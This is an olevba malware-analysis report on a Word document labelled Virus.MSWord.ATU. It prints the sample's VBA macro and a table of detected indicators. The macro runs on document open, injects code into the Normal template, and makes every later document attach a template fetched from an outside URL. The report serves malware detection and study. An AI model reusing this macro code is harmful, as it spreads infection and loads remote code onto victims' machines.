olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.ATU-fca133da873d021c0182ef927d5081aabb23f2a4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.ATU-fca133da873d021c0182ef927d5081aabb23f2a4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'Active Template Update v0.2 /1nternal
Private Sub document_open()
    On Error Resume Next
    For Each TT In Templates
        If TT.VBProject.VBComponents(1).CodeModule.Lines(1, 1) = "'<!--1nternal-->" Then Exit For
    Next
    Set TT = TT.VBProject.VBComponents(1).CodeModule
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    If NT.Lines(1, 1) <> "'<!--1nternal-->" Then
        NT.InsertLines 1, "'<!--1nternal-->"
        NT.InsertLines 2, "Private Sub Document_open"
        NT.InsertLines 3, "On Error Resume Next"
        NT.InsertLines 4, "ActiveDocument.AttachedTemplate = ""http://www.sourceofkaos.com/homes/1nternal/update.dot"""
        NT.InsertLines 5, "End Sub"
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.sourceofk|URL                                          |
|          |aos.com/homes/1ntern|                                             |
|          |al/update.dot       |                                             |
+----------+--------------------+---------------------------------------------+

